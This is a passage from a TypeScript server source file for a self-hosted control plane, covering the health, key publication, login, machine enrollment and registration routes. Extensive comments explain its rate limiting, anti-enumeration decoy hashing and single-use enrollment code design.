   * paragraph claimed the set was complete** — "the rest of what an authenticated
   * caller can make this process write" was written with the rename still
   * uncounted. It is one `UPDATE` rather than a transaction, which is why it did
   * not read like a write, and it loops: `nameVisibleTo` excludes the machine
   * being renamed, so renaming it to the name it already has succeeds every time.
   * The count is stated here rather than derived, so it is the thing to check
   * against `spendWrite(` when a route is added.
   */
  const spendWrite = (c: Context, what: string): Response | null => {
    const caller = c.get("caller");
    const key = writeKey(caller.userId, what);
    const decision = writeThrottle.check(key);
    if (!decision.allowed) return tooManyAttempts(c, decision.retryAfterSeconds);
    writeThrottle.fail(key);
    return null;
  };

  const mail = options.mail ?? null;

  /**
   * One machine shape for every admin route that returns one. See the helper below.
   *
   * The single-machine routes ask `machineStanding` per row, which is one
   * statement for the one machine they are about. `GET /v1/admin/machines`
   * binds a different `overLimit` — a set built once — because asking per row
   * there is N+1 over the whole fleet.
   */
  const adminMachine = (row: Record<string, unknown>): Record<string, unknown> =>
    // `relayUrlFor`, not the shared value: the admin list and the owner list
    // describing the same machine's `relayUrl` differently is the kind of
    // disagreement nobody reports and everybody distrusts.
    adminMachineProjection(
      row,
      relayUrlFor,
      relayOnline,
      (id) => machineStanding(db, id)?.over ?? false,
      (id) => {
        const owner = ownerOf(db, id);
        return owner === null ? null : { userId: owner.userId, label: owner.label };
      },
      lastSeenAt,
    );

  /* ---------------------------------------------------------------- *
   * Mail, as this file uses it
   * ---------------------------------------------------------------- */

  /** Where a link points. Trailing slash already stripped by `mailConfig`. */
  const publicOrigin = (): string => readString(db, "mail.public_url") ?? "";

  /**
   * The instance's own name, for a message read out of context.
   *
   * The host of `mail.public_url` rather than a configured display name: one
   * fewer setting, and it is the string somebody will recognise because it is
   * the one in their address bar.
   */
  const instanceName = (): string => {
    try {
      return new URL(publicOrigin()).host;
    } catch {
      return issuer;
    }
  };

  /**
   * Queue a message, or answer why not.
   *
   * Returns `false` when the outbox is full, which the caller turns into
   * `503 overloaded` — *"a tunnel with no daemon is a 503, never a queue"*,
   * applied to the one queue this service has.
   */
  const send = (to: string, kind: Parameters<MailSender["enqueue"]>[0]["kind"], template: Template, notAfter: number): boolean => {
    if (mail === null) return false;
    return (
      mail.enqueue({
        to,
        kind,
        subject: template.subject,
        text: template.text,
        html: template.html,
        notAfter,
      }) !== null
    );
  };

  /**
   * Record that this address is about to be mailed, and whether that is allowed.
   *
   * The **recipient**-keyed bound, and the only one in this service that follows
   * the victim rather than the caller: every other counter keys on
   * `callerAddressOf`, which `net.ts` says is caller-supplied and which a botnet
   * or a forged `x-forwarded-for` rotates for free. Shared across registration,
   * forgot and an address change, so three an hour is three in total — otherwise
   * the routes compose into nine messages.
   */
  const mayMail = (emailFolded: string): boolean => {
    if (!mailThrottle.check(mailKey(emailFolded)).allowed) return false;
    mailThrottle.fail(mailKey(emailFolded));
    return true;
  };

  /**
   * The same question for reset mail, against its own counter.
   *
   * Deliberately **not** also spending `mayMail`: sharing is what let a stranger
   * close somebody's only way back into their account, which is the whole of
   * `RESET_MAIL_THROTTLE`'s docblock. The two budgets are independent, so a
   * registration flood aimed at an address cannot take its owner's recovery with
   * it, and a reset flood cannot take their sign-up confirmations.
   */
  const mayMailReset = (emailFolded: string): boolean => {
    if (!resetMailThrottle.check(resetMailKey(emailFolded)).allowed) return false;
    resetMailThrottle.fail(resetMailKey(emailFolded));
    return true;
  };

  /**
   * Whether the once-a-day notice to a real owner has already gone out.
   *
   * The bound `schema.sql`'s `idx_mail_outbox_notice`, `sentRecently`'s docblock
   * and CLAUDE.md's Bounds table all promised, and which nothing implemented:
   * `sentRecently` had zero callers, so the only limit on a message sent to a
   * *third party* on an *anonymous* request was the shared three-an-hour — and a
   * restart cleared even that, because the throttle is in memory while this is a
   * query against the outbox itself.
   */
  const noticeAlreadySent = (emailFolded: string, now: number): boolean =>
    mail !== null && sentRecently(db, emailFolded, "register_notice", NOTICE_INTERVAL_MS, now);

  /* ---------------------------------------------------------------- *
   * Public
   * ---------------------------------------------------------------- */

  /**
   * Alive, and able to answer — which used to be two different claims and one
   * answer.
   *
   * This returned a literal. Nothing in it touched the database, so a disk that
   * had filled, a volume that had gone read-only or a file that would not open
   * reported `ok: true` for ever: reads keep succeeding while writes throw
   * `SQLITE_FULL`, every login and every token mint 500s, `deploy.sh`'s probe
   * goes green and compose's healthcheck never fires. The only endpoint that
   * exists to say "something is wrong here" was the one thing that could not.
   *
   * One indexed read, against the table this service cannot work without: the
   * signing keys. **Absence is not failure** — a relay may create the schema
   * before the API has minted a key, which `compose.yml` calls out as the normal
   * first boot — so only a *throw* is unhealthy. That keeps the probe honest in
   * both directions rather than trading one false answer for another.
   *
   * Deliberately still a read rather than a write probe. This route has no
   * credential, so a write here would be an unauthenticated way to make the
   * process holding every tunnel in the fleet do disk IO on demand. What a read
   * cannot see is exactly `SQLITE_FULL`, and the honest place to catch that is
   * the write path's own reporting rather than a public endpoint.
   *
   * **`database` is a token and never the driver's text.** It carried
   * `describeError(error)`, and `node:sqlite` puts the absolute path of the file
   * in its messages — so an unauthenticated probe answered with the layout of the
   * host's disk the moment anything went wrong, which is precisely the moment
   * somebody is watching. The distinction the probe exists for is `ok` against
   * not-`ok`; nothing downstream parses this string, and there is nowhere in this
   * file for the detail to go, since `app.ts` may not write to a stream.
   */
  const healthRead = db.prepare("SELECT 1 AS ok FROM signing_keys LIMIT 1");
  app.get("/health", (c) => {
    let database = "ok";
    try {
      healthRead.get();
    } catch {
      // Nothing to report it through, and the text is what must not go out.
      database = "unavailable";
    }
    return c.json(
      {
        ok: database === "ok",
        issuer,
        // Same reasoning as the daemon's: a clock is not a secret, and short-lived
        // tokens make skew a real way to be locked out.
        time: Date.now(),
        tokenTtlSeconds,
        database,
      },
      database === "ok" ? 200 : 503,
    );
  });

  /**
   * The public keys. Unauthenticated, because a public key is public.
   *
   * Published for inspection and for a manual re-enrollment; daemons do *not*
   * poll this. If they did, this service would be back in the runtime path.
   */
  app.get("/v1/jwks", (c) =>
    // `activePublicKeys`, not `activeSigningKeys`: this route is unauthenticated,
    // and the private key has no business being loaded on a path that runs on
    // input from anyone at all.
    c.json({ keys: activePublicKeys(db).map((key) => ({ kid: key.kid, jwk: key.jwk })) }),
  );

  /* ---------------------------------------------------------------- *
   * Signing in. No credential — that is what this route is for.
   *
   * Above THE LINE below, deliberately and necessarily. Everything else that is
   * public up here is public because it holds nothing secret (`/health`,
   * `/v1/jwks`) or because it carries its own credential (`/v1/enroll`, where the
   * code *is* the credential). This one is the third kind: it is where a
   * credential comes from.
   * ---------------------------------------------------------------- */

  app.post("/v1/login", bodyLimit({ maxSize: PUBLIC_BODY_LIMIT_BYTES, onError: payloadTooLarge }), async (c) => {
    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");
    const name = body["name"];
    const password = body["password"];
    /*
     * ⚠ **The field is still called `name` and now takes a name *or* an email
     * address.** Renaming it would break every older client and `cpctl` at once
     * for the sake of a label, and there is one identifier on this wire either
     * way — the lookup below decides which kind it turned out to be.
     *
     * `MAX_EMAIL_CHARS` rather than the 200 that used to be here: 200 is
     * `users.name`'s own ceiling, and `mail/address.ts` allows an address 254, so
     * leaving it refuses a legal address as `bad_request` — a *different* answer
     * from `invalid_login`, i.e. an oracle that says "too long to be one of ours".
     */
    if (typeof name !== "string" || name.trim().length === 0 || name.length > MAX_EMAIL_CHARS) {
      return jsonError(c, 400, "bad_request", "a name or email address is required");
    }
    if (typeof password !== "string" || password.length === 0) {
      return jsonError(c, 400, "bad_request", "password is required");
    }

    /*
     * Two counters, checked before the lookup and before the KDF, so a blocked
     * caller costs two map probes.
     *
     * **The identity key is `<name, address>` and never the bare name**, which is
     * what stops this being a lockout weapon: keyed on the name alone, eleven
     * unauthenticated requests naming `ada` made ada's own sign-in answer 429
     * *with the correct password*. Keyed on what was submitted *and* where it came
     * from, being throttled still proves nothing about whether the account exists
     * — which is what lets this be an honest 429 rather than another
     * indistinguishable 401 — while a block follows the guesser instead of the
     * name they typed.
     *
     * The address counter is the other half and neither is sufficient alone: a
     * per-identity threshold is never reached by somebody spraying a thousand
     * distinct names, and a per-address one is never reached by somebody guessing
     * one password from a thousand hosts. See `throttle.ts` for what each is
     * honestly worth behind a proxy.
     */
    const address = callerAddress(c);
    const attemptKey = loginKey(name, address);
    const sprayKey = addressKey(address);
    const decision = throttle.check(attemptKey);
    const spray = addressThrottle.check(sprayKey);
    if (!decision.allowed || !spray.allowed) {
      // Whichever block is longer decides the header: retrying at the shorter one
      // would be refused again by the other, which reads as the header being wrong.
      const retryAfterSeconds = Math.max(decision.retryAfterSeconds, spray.retryAfterSeconds);
      return tooManyAttempts(c, retryAfterSeconds, "too many sign-in attempts — wait and try again");
    }

    /*
     * **Recorded now, before the await, and undone below if the password is
     * right.** `check` is synchronous and `fail` used to run only *after*
     * `await verifyPassword`, so every guess arriving inside one KDF window saw a
     * counter nothing had incremented yet — measured with a driver, 40 concurrent
     * guesses reached 36 real verifications against a threshold of 5. Recording
     * optimistically closes that window and costs nothing a wrong-then-right
     * sequence did not already cost, because forgetting the failures is exactly
     * what `succeed` promises.
     */
    throttle.fail(attemptKey);
    addressThrottle.fail(sprayKey);

    /*
     * **A name, then a verified address. In that order, and the order is the whole
     * of the ambiguity rule.**
     *
     * `USER_NAME` has no `@` in its character class, so no name created through a
     * validated route can also be an address — but names are checked at *creation
     * only* and a row written before that rule keeps working, so a legacy name
     * holding an `@` is reachable. Trying the name first makes that case
     * deterministic without a new status code. A `409 user_ambiguous` — what
     * `POST /v1/provision` answers for a name two accounts share bar case — would
     * be wrong here twice over: this route is unauthenticated, so a distinguishable
     * refusal is an oracle telling a stranger the string names *something*, and
     * `webcheck` pins the set of codes that may end a browser session at six.
     *
     * **Verified addresses only**, through `verifiedOwnerOf`. `idx_user_emails_verified`
     * is a *partial* unique index — uniqueness holds for `verified_at IS NOT NULL`
     * and for nothing else — because an unverified claim arrives from the anonymous
     * `/v1/register` and reserves nothing. Resolving on the address alone would let
     * anybody claim a stranger's address unverified and become a second candidate
     * for it, which is the squatting hazard that index was shaped against.
     *
     * Two indexed `.get()`s with no `await` between them, which is what keeps the
     * decoy branch below honest: "no such name" and "no such address" cost the same
     * handful of microseconds and both arrive at the same KDF.
     */
    const submitted = name.trim();
    let user = db.prepare("SELECT id, name, is_admin, disabled_at FROM users WHERE name = ?").get(submitted);
    if (user === undefined) {
      const checked = checkEmailAddress(submitted);
      if (checked.ok) {
        const owner = verifiedOwnerOf(db, checked.folded);
        if (owner !== null) {
          user = db.prepare("SELECT id, name, is_admin, disabled_at FROM users WHERE id = ?").get(owner);
        }
      }
    }
    const stored =
      user === undefined
        ? undefined
        : db.prepare("SELECT hash FROM user_passwords WHERE user_id = ?").get(String(user["id"]));

    try {
      /*
       * **Every branch spends what a real verification spends.**
       *
       * An unknown name and a user who has no password row both verify against a
       * decoy rather than returning early. Without that this route answers in
       * microseconds for a name nobody has and in ~50ms for one somebody does,
       * which is a user oracle measurable over the network in a handful of
       * samples — and enumerating users is the first half of attacking them.
       */
      if (user === undefined || stored === undefined) {
        // `"public"` in both halves of the branch, and the decoy takes the same
        // lane for the same reason it takes the same time: queueing in a
        // different lane from a real verification would rebuild the user oracle
        // out of the defence against flooding, under load and therefore exactly
        // when somebody is looking.
        await verifyAgainstDecoy(password, "public");
        return jsonError(c, 401, "invalid_login", "those sign-in details do not match");
      }

      const verified = await verifyPassword(password, String(stored["hash"]), "public");
      if (!verified.ok) {
        // No `fail` here — the attempt was recorded before the await.
        return jsonError(c, 401, "invalid_login", "those sign-in details do not match");
      }

      /*
       * Cleared as soon as the password is known to be right, and **before** the
       * disabled check below. Somebody holding the correct password is not
       * guessing whatever their account's state is, and leaving the optimistic
       * failure recorded would let a disabled person's own retries block the
       * address every one of their colleagues shares.
       */
      throttle.succeed(attemptKey);
      // `forgive`, never `succeed`: this key is shared by everybody who appears
      // to be at that address, and deleting it lets one held credential zero the
      // only counter that sees a spray across distinct names — along with the
      // `/v1/register` and `/v1/forgot` records that spend the same bucket and
      // are documented as never cleared. See `LoginThrottle.forgive`.
      addressThrottle.forgive(sprayKey);

      /*
       * Checked *after* the password verified, and the order is the whole point.
       *
       * Folding this into `invalid_login` would leak nothing — but it would also
       * tell a disabled person nothing, so they retype a password that is correct,
       * for ever. Answering only once the password is right leaks the account's
       * state to somebody who has just proved they are its owner.
       */
      if (user["disabled_at"] !== null) {
        return jsonError(c, 403, "user_disabled", "this account has been disabled");
      }

      /*
       * Re-hash if the stored row predates the current parameters.
       *
       * Best effort, and the try/catch is load-bearing: a failure here must never
       * fail a sign-in that has already succeeded. This is the only way raising N
       * ever reaches an existing password, since there is nothing else that knows
       * the plaintext.
       */
      if (verified.needsRehash) {
        try {
          // `"public"`, even though the password has just verified: the lane is
          // about which side of the credential gate the *route* sits on, and this
          // one is above THE LINE. A best-effort rehash must not be able to take
          // a slot an admin's password reset is waiting for.
          const rehashed = await hashPassword(password, "public");
          db.prepare("UPDATE user_passwords SET hash = ?, updated_at = ? WHERE user_id = ?").run(
            rehashed,
            Date.now(),
            String(user["id"]),
          );
        } catch {
          // The sign-in stands. The row is re-tried on the next one.
        }
      }

      const session = mintSession(db, String(user["id"]), {
        ip: address,
        // Recorded verbatim and clamped in `mintSession`. Not parsed here: what a
        // string of it *means* is a question with no server-side answer that
        // stays right, so the raw value crosses the wire and the client turns it
        // into words it can also change its mind about.
        userAgent: c.req.header("user-agent") ?? null,
      });
      return c.json({
        token: session.token,
        sessionId: session.id,
        expiresAt: session.expiresAt,
        user: {
          id: String(user["id"]),
          name: String(user["name"]),
          isAdmin: Number(user["is_admin"]) === 1,
        },
        // So a client can tell "my clock is wrong" from "the token was refused",
        // exactly as `POST /v1/tokens` does.
        serverTime: Date.now(),
      });
    } catch (error) {
      if (error instanceof PasswordBusyError) {
        return passwordBusy(c, "too many sign-in attempts in flight — try again in a moment");
      }
      throw error;
    }
  });

  /* ---------------------------------------------------------------- *
   * Enrollment. No API key — the code is the credential.
   * ---------------------------------------------------------------- */

  app.post("/v1/enroll", bodyLimit({ maxSize: PUBLIC_BODY_LIMIT_BYTES, onError: payloadTooLarge }), async (c) => {
    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");
    const code = body["code"];
    if (typeof code !== "string" || code.length === 0) {
      return jsonError(c, 400, "bad_request", "code is required");
    }

    /*
     * The one public route that counted nothing, and now the last one to get a
     * builder.
     *
     * A daemon redeems its code once, at startup, so a threshold of thirty is
     * invisible to every legitimate caller. What it bounds is an unauthenticated
     * flood: each request is a `hashCredential` plus a conditional `UPDATE`,
     * which acquires the WAL writer lock on a database the relay process shares
     * — and a `SQLITE_BUSY` there costs one stale presence row per tick.
     *
     * Counted on every attempt rather than on failures alone: there is no
     * identity here to be fair to, the credential *is* the body, and a caller
     * with a real code sends one request.
     */
    const address = callerAddress(c);
    const guess = enrollKey(address);
    const guessed = addressThrottle.check(guess);
    if (!guessed.allowed) return tooManyAttempts(c, guessed.retryAfterSeconds);
    addressThrottle.fail(guess);

    const now = Date.now();
    const hash = hashCredential(code);

    /*
     * Single-use, enforced by the database.
     *
     * One conditional UPDATE, then a check that it changed exactly one row.
     * Reading the row and then marking it used would leave a window in which
     * two daemons could both pass the read — and the whole point of a
     * single-use code is that they cannot. SQLite serializes the writes, so
     * exactly one caller sees `changes === 1`.
     *
     * The expiry is in the WHERE clause for the same reason: checked and acted
     * on in one statement, never across two.
     */
    const claimed = db
      .prepare(
        "UPDATE enrollment_codes SET used_at = ?, used_from = ? " +
          "WHERE code_hash = ? AND used_at IS NULL AND expires_at > ?",
      )
      .run(now, address, hash, now);

    if (claimed.changes !== 1) {
      // Deliberately one answer for "no such code", "already redeemed" and
      // "expired". An unauthenticated caller holding a wrong code learns only
      // that it did not work; the operator sees which it was in the row.
      return jsonError(
        c,
        409,
        "code_unusable",
        "this enrollment code is unknown, already used, or expired",
      );
    }

    const row = db.prepare("SELECT machine_id FROM enrollment_codes WHERE code_hash = ?").get(hash);
    const machineId = String(row?.["machine_id"] ?? "");
    const machine = db.prepare("SELECT id, revoked_at FROM machines WHERE id = ?").get(machineId);
    if (!machine) {
      return jsonError(c, 409, "machine_missing", "the machine this code was issued for no longer exists");
    }
    // Checked after the claim, so a code aimed at a revoked machine is burned
    // rather than left usable for the moment somebody un-revokes it.
    if (machine["revoked_at"] !== null) {
      return jsonError(c, 403, "machine_revoked", "this machine has been revoked");
    }

    db.prepare("UPDATE machines SET enrolled_at = ? WHERE id = ?").run(now, machineId);

    // Public halves only. Enrollment hands a daemon the keys that *verify* tokens
    // addressed to it; it never signs anything here.
    const keys = activePublicKeys(db);
    if (keys.length === 0) {
      return jsonError(c, 503, "no_signing_key", "this control plane has no signing key");
    }

    /*
     * The tunnel credential.
     *
     * Enrollment already hands out identity; until now none of it was something
     * the daemon could use to *prove* who it is on a later connection — a public
     * key is public and a machine id is a name. Issuing it here, rather than from
     * a route of its own, keeps the property that a daemon talks to this service
     * exactly once.
     *
     * Minted unconditionally, even when no relay is configured. A relay switched
     * on later must not require re-enrolling the fleet, and the credential is
     * worthless without a relay to present it to.
     */
    const tunnelKey = issueTunnelKey(db, machineId);

    // Every active key, not just the signing one: a daemon never comes back for
    // more, so a rotation in flight has to be handed over in full or the daemon
    // will reject tokens signed by the key it was not told about.
    return c.json({
      machineId,
      issuer,
      keys: keys.map((key) => ({ kid: key.kid, jwk: key.jwk })),
      // Additive, and additive in both directions: an older daemon ignores these
      // (`parseEnrollResponse` skips unknown fields) and a newer daemon meeting an
      // older control plane simply finds no relay and never dials one.
      tunnelKey,
      relay: relayUrl === null ? null : { url: relayUrl },
      serverTime: now,
    });
  });

  /* ---------------------------------------------------------------- *
   * Registration and recovery, all of it above THE LINE.
   *
   * ⚠ **Every route in this block that can carry a body carries its own
   * `bodyLimit`.** The positional 256 KiB limit below is registered *after* the
   * credential gate and therefore never runs for anything here, so a route added
   * to this block without one is an unbounded read by an anonymous caller —
   * passing every other check, and visible only as a `413` that does not happen.
   * `relaycheck` pushes 65 KiB at each of them for exactly that reason.
   *
   * The qualifier is load-bearing rather than a hedge: `GET /v1/instance` has no
   * limit and needs none, because a `GET` cannot carry a body and Hono's
   * `bodyLimit` returns at its first line without one. Adding it anyway to keep
   * the sentence unqualified was tried and reverted — the note at that route
   * records why an inert middleware is the worse of the two.
   *
   * The two shapes of refusal in this block are worth naming together, because
   * they look inconsistent and are not:
   *
   *   - **a login name is spoken for → `409`.** A name is the login, so it has
   *     to be pickable, and the alternative is a form nobody can complete. This
   *     hands back the user enumeration that `POST /v1/login` spends a decoy hash
   *     to deny, and that is accepted rather than papered over: what bounds it is
   *     that every branch costs the same scrypt, each probe takes one of two
   *     fleet-wide public-lane slots, and `registerKey` blocks a host after five.
   *   - **an address is spoken for → the same `200` as a fresh one**, plus a
   *     notice to whoever actually owns it. An address is not something the
   *     person at the keyboard gets to choose, so refusing would leak somebody
   *     else's membership for no benefit to the caller.
   * ---------------------------------------------------------------- */

  /**
   * What this instance allows, for the screen that has no credential yet.
   *
   * **Not folded into `/health`.** That route is on the container's
   * `HEALTHCHECK` every fifteen seconds and `imagecheck` pins its shape; putting
   * product state on it means a settings read on the liveness path and a
   * container that can go unhealthy because somebody turned registration off.
   *
   * Two independent booleans rather than one mode, because the fourth
   * combination is real and important: **registration closed with mail
   * configured** is an admin-only instance where people can still recover their
   * own accounts. A client keyed on a single "self-service" flag would close the
   * reset door when registration closed, which is the cell that costs somebody
   * their account.
   */
  /*
   * **The one route in this block with no `bodyLimit`, and it is exempt rather
   * than overlooked.** A `GET` cannot carry a body to bound: `undici` refuses to
   * construct such a request at all, and `@hono/node-server` sets `init.body`
   * only for other methods — so Hono's `bodyLimit` returns at its own first line
   * on `!c.req.raw.body` and would be inert middleware whose only effect is to
   * make a sentence above look true. It was briefly added for exactly that
   * reason and taken back out: a rule kept honest by a no-op is worse than a rule
   * with a stated exception, because the next reader copies the no-op.
   *
   * The exception is safe only while this route stays a `GET`. Give it a body and
   * it needs the limit, like everything else above THE LINE.
   */
  app.get("/v1/instance", (c) => {
    const mode = registrationMode(db);
    return c.json({
      registration: { enabled: mode.enabled, requiresEmail: mode.requiresEmail },
      mail: { configured: mailConfigured(db).configured },
      /*
       * Where the plugin market's catalogue lives, or `null`.
       *
       * ⚠ **The value rather than a boolean, and it is safe to publish because
       * the CSP already names it.** A client cannot be told "there is a
       * catalogue" and left to guess the address — and it cannot be handed one
       * the document's own `connect-src` does not list, because both come from
       * the same variable read once at construction. Publishing it here is
       * therefore publishing something already in a response header on this very
       * page.
       *
       * Above the credential line with the rest of `/v1/instance`, which is
       * correct: whether this instance has a market is a fact about the instance,
       * not about who is asking.
       */
      plugins: { catalogue: pluginCatalogueUrl },
      // The AGPL §13 offer. Public because the people it is owed to are the ones
      // who have not signed in — see `SOURCE_URL`.
      source: { url: SOURCE_URL, version: VERSION },
      serverTime: Date.now(),
    });
  });

  /**
   * Ask for an account.
   *
   * **Hash first, branch second.** The password is hashed before anything is
   * looked up, so "that name is taken", "that address is taken" and "here is your
   * link" all cost the same ~51ms. Without it the `409` would be a timing oracle
   * as well as a status one, and the status one is the part that is unavoidable.
   *
   * The lane is `"public"`, and it has to be: `HashLane` has no default precisely
   * so this cannot be forgotten. What it costs is stated rather than hidden —
   * `MAX_CONCURRENT_PUBLIC` is 2 and is now shared with `POST /v1/login`, so a
   * registration flood refuses sign-ins and a sign-in flood refuses
   * registrations. That is the correct trade, and the answer is *not* a third
   * lane: the authenticated lane exists so the remedy always has somewhere to run,
   * and adding a lane per public route would give an attacker one more.
   */
  app.post("/v1/register", bodyLimit({ maxSize: PUBLIC_BODY_LIMIT_BYTES, onError: payloadTooLarge }), async (c) => {
    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");

    const mode = registrationMode(db);
    if (!mode.enabled) {
      return jsonError(c, 403, "registration_disabled", "this control plane does not accept new accounts");
    }

    const name = body["name"];
    const password = body["password"];
    if (typeof name !== "string" || name.trim().length === 0 || name.length > 200) {
      return jsonError(c, 400, "bad_request", "name is required");
    }
    const trimmed = name.trim();
    if (!USER_NAME.test(trimmed)) return jsonError(c, 400, "bad_request", USER_NAME_HELP);
    if (typeof password !== "string" || password.length > MAX_PASSWORD_FIELD_CHARS) {
      return jsonError(c, 400, "bad_request", "password is required");
    }
    const weak = checkPasswordPolicy(password, trimmed);
    if (weak !== null) return jsonError(c, 400, "weak_password", weak);

    /*
     * The address is required exactly when mail works, and **refused when it does
     * not**. Accepting and discarding it would silently drop something somebody
     * typed and expects to matter — and worse, would leave them believing they
     * have a recovery address they do not have.
     */
    const rawEmail = body["email"];
    let email: { address: string; folded: string } | null = null;
    if (mode.requiresEmail) {
      const checked = checkEmailAddress(rawEmail);
      if (!checked.ok) return jsonError(c, 400, "bad_request", checked.message);
      const domains = parseEmailDomains(readString(db, "registration.email_domains"));
      if (!emailDomainAllowed(checked.folded, domains)) {
        // Deliberately the same sentence a malformed address gets: the allowlist
        // is not published, and naming it would tell a stranger which employer
        // this instance belongs to.
        return jsonError(c, 400, "bad_request", "that address cannot be used to sign up here");
      }
      email = { address: checked.address, folded: checked.folded };
    } else if (rawEmail !== undefined && rawEmail !== null && rawEmail !== "") {
      return jsonError(c, 400, "bad_request", "this control plane cannot send mail, so it cannot take an address");
    }

    const address = callerAddress(c);
    const attempt = registerKey(trimmed, address);
    const spray = addressKey(address);
    const decision = throttle.check(attempt);
    const sprayed = addressThrottle.check(spray);
    if (!decision.allowed || !sprayed.allowed) {
      return tooManyAttempts(
        c,
        Math.max(decision.retryAfterSeconds, sprayed.retryAfterSeconds),
        "too many sign-up attempts — wait and try again",
      );
    }
    /*
     * Recorded before the await, like every other counter here — and **never
     * cleared**, which is the one place this file departs from the login
     * protocol. `succeed()` means "the credential turned out to be right", and a
     * registration presents no credential. Leaving the optimistic record standing
     * is what makes the threshold mean *how many accounts one host may create*.
     * Deleting it as an oversight would switch this counter off entirely.
     */
    throttle.fail(attempt);
    addressThrottle.fail(spray);

    let hash: string;
    try {
      hash = await hashPassword(password, "public");
    } catch (error) {
      if (error instanceof PasswordBusyError) {
        return passwordBusy(c, "too many sign-ups in flight — try again in a moment");
      }
      throw error;
    }

    const now = Date.now();
    /*
     * **Signing up again is how a lost confirmation mail is resent**, which is
     * why this asks `nameTakenByAnother` rather than `nameTaken`: a pending
     * sign-up holds its own name for 24 hours, and refusing the person who
     * created it would leave a mail that never arrived with no remedy. The
     * previous link stops working the moment `mintRegistration` supersedes it,
     * in one transaction — the same property the deleted `POST
     * /v1/register/resend` relied on, reached through the form somebody is
     * already looking at.
     */
    if (nameTakenByAnother(db, trimmed, email?.folded ?? null, now)) {
      return jsonError(c, 409, "name_taken", "somebody already has that name");
    }

    // No mail: there is nothing to confirm, so the account exists now and this
    // answers with a session. One route rather than two, because two would mean
    // the client had to know the mode before it could pick one — a second place
    // for the matrix to live, and a second place for it to be wrong.
    if (!mode.requiresEmail) {
      const userId = newId("u");
      db.exec("BEGIN");
      try {
        db.prepare("INSERT INTO users (id, name, is_admin, created_at) VALUES (?, ?, 0, ?)").run(userId, trimmed, now);
        db.prepare("INSERT INTO user_passwords (user_id, hash, updated_at) VALUES (?, ?, ?)").run(userId, hash, now);
        db.exec("COMMIT");
      } catch (error) {
        db.exec("ROLLBACK");
        if (isUniqueViolation(error)) return jsonError(c, 409, "name_taken", "somebody already has that name");
        throw error;
      }
      const session = mintSession(db, userId, {
        ip: address,
        userAgent: c.req.header("user-agent") ?? null,
      });
      return c.json(
        {
          pending: false,
          token: session.token,
          sessionId: session.id,
          expiresAt: session.expiresAt,
          user: { id: userId, name: trimmed, isAdmin: false },
          serverTime: now,
        },
        201,
      );
    }

    const folded = email?.folded ?? "";
    const existingOwner = verifiedOwnerOf(db, folded);
    const pending = pendingForEmail(db, folded, now);

    /*
     * The address is spoken for. Same status, same body, same shape as a fresh
     * one — and a notice to the person who actually owns it, bounded to one a
     * day, because that message is itself mail sent to a third party on an
     * anonymous request.
     */
    if (existingOwner !== null || pending !== null) {
      if (existingOwner !== null && !noticeAlreadySent(folded, now) && mayMail(folded)) {
        send(
          email?.address ?? "",
          "register_notice",
          registrationNotice({
            instance: instanceName(),
            signInUrl: `${publicOrigin()}/`,
            forgotUrl: `${publicOrigin()}/forgot`,
          }),
          now + REGISTRATION_TTL_MS,
        );
      } else if (pending !== null && mayMail(folded)) {
        /*
         * **This is where the resend route went, and the row is the reason it
         * had to come here rather than be replaced by "just sign up again".**
         *
         * Everything mailed below comes from `pending` — the stored name and the
         * stored password hash — and **nothing at all from this request**. That
         * is the whole security content. The obvious shape, letting a second
         * sign-up supersede the first with the caller's own password, is an
         * account takeover: name and address are both guessable, so a stranger
         * mints a link carrying *their* hash, it lands in the real person's
         * mailbox looking exactly like the one they were waiting for, and the
         * account is created with a password they have never seen. The deleted
         * route was safe for precisely this reason — it took an address and
         * nothing else — and moving it inside the form keeps that property while
         * removing the button.
         *
         * Silent to the caller, like every other arm here: same status, same
         * body. Somebody who re-submits the form because their mail never
         * arrived gets another copy of *their* link; a stranger who guesses the
         * pair achieves nothing but re-mailing somebody else's own link to
         * themselves, bounded at three an hour by `mayMail`.
         */
        const again = mintRegistration(
          db,
          { name: pending.name, email: pending.email, passwordHash: pending.passwordHash },
          REGISTRATION_TTL_MS,
          now,
        );
        send(
          pending.email,
          "register",
          registrationConfirm({
            name: pending.name,
            url: `${publicOrigin()}/confirm#t=${again.token}`,
            lifetime: lifetimeText(REGISTRATION_TTL_MS),
          }),
          again.expiresAt,
        );
      }
      return c.json({ pending: true, expiresAt: now + REGISTRATION_TTL_MS });
    }

    const minted = mintRegistration(
      db,
      { name: trimmed, email: email?.address ?? "", passwordHash: hash },
      REGISTRATION_TTL_MS,
      now,
    );
    if (mayMail(folded)) {
      /*
       * **The refusal is swallowed, and that is the same rule the arm above
       * follows.** Answering `503` here while a taken address answers `200` made
       * the two branches tell apart under exactly the condition an attacker
       * would create — a full outbox — which is the enumeration oracle this
       * route spends a whole branch and a whole scrypt avoiding. The pending row
       * is already written and signing up again re-sends it, so the caller loses
       * nothing by being told the ordinary thing.
       */
      send(
        email?.address ?? "",
        "register",
        registrationConfirm({
          name: trimmed,
          url: `${publicOrigin()}/confirm#t=${minted.token}`,
          lifetime: lifetimeText(REGISTRATION_TTL_MS),
        }),
        minted.expiresAt,
      );
    }
    return c.json({ pending: true, expiresAt: minted.expiresAt });
  });

  /**
   * Finish a sign-up, which is what creates the account — and **nothing else**.
   *
   * It does not sign anybody in; see the comment where the session used to be
   * minted. The answer carries no credential at all, which is what makes this
   * route safe to reach from a link that has been sitting in a mailbox.
   *
   * No KDF here at all: the hash was computed at registration, which is what
   * makes an unauthenticated route that writes to `users` cheap enough to sit
   * above THE LINE. The whole write is one transaction with **no `await` between
   * `BEGIN` and `COMMIT`** — possible only because of that, and required because
   * this connection is shared and synchronous.
   */
  app.post(
    "/v1/register/confirm",
    bodyLimit({ maxSize: PUBLIC_BODY_LIMIT_BYTES, onError: payloadTooLarge }),
    async (c) => {
      const body = await readJsonObject(c);
      const token = body?.["token"];
      if (typeof token !== "string" || token.length === 0 || token.length > 200) {
        return jsonError(c, 400, "bad_request", "token is required");
      }

      const address = callerAddress(c);
      const key = confirmKey(address);
      const decision = throttle.check(key);
      if (!decision.allowed) return tooManyAttempts(c, decision.retryAfterSeconds);
      throttle.fail(key);

      /*
       * **Asked again here, because closing registration has to close it.**
       *
       * A pending sign-up lives 24 hours, so without this an admin who turns
       * registration off — which is the remedy somebody reaches for while being
       * abused — would still watch accounts appear for the rest of the day, from
